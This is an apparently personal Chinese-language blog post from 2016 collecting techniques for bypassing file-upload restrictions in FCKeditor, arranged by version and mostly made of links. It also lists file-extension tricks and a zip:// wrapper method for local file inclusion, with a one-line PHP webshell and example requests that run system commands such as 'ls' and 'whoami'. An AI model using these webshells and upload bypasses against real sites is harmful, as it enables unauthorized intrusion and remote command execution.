---
layout:     post
title:      fckeditor各版本绕过
date:       2016-08-12
summary:    fckeditor各版本绕过
categories: web
tags:
 - fckeditor
 - web
 - upload
---

### 0x00 fckeditor上传漏洞总结

    http://sec.chinabyte.com/206/13708206.shtml
    http://www.cnbraid.com/2015/07/09/fckeditor/
    http://www.it610.com/article/1842939.htm
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf <=2.6.4

### 0x01 asp

    <=2.6.4
        http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
    2.6.6
        http://www.hack80.com/thread-320-1-1.html
        http://www.qhwins.com/ShowNews/?11-20109214030542523.html
    2.6.8
        http://www.freebuf.com/vuls/6408.html

### 0x02 php

    <=2.6.4
        http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf

### 0x03 fckeditor经典尝试后缀

    1>将后缀改成.php.pjpg
    2>将后缀改成.html
    3>将后缀改成.lnk

### 0x04 其它上传技巧

    1>上传时,延迟一下再上传,有时能bypass admin,用到firefox tamper插件
        https://www.youtube.com/watch?v=ndeYnMoFPx8
        管理员登录绕过
            https://www.youtube.com/watch?v=UO-vzWFctTA
            https://www.youtube.com/watch?v=a5fm629s8Ao
                firefox noredirect插件
    2>双文件上传
    3>上传以图片后缀名为后缀的压缩文件,文件实际是一个webshell.php文件的压缩文件(zip),利用lfi漏洞并将lfi要包含
      的文件的参数赋值为:
        zip://archive.zip#webshell.php
        或
        zip://archive.zip#webshell.php&param1=system&param2=ls   ===>这里对应webshell.php为:
            <?php $_GET['param1']($_GET['param2']);?>
      这里适用的情况为:
        a>可上传任意内容文件(通过修改Content-Type等达到目的),但文件会被重命令为以png为后缀文件
        b>找到了lfi漏洞,但是lfi漏洞不能包函.|./|..|..\|...等情况
      更多细节:
        https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
    4>上传图片被resize等修改时,绕过方法: 
        https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
<a href="https://www.idontplaydarts.com/images/phppng.png">phppayload</a>
        x.php?0=system post data:1=whoami
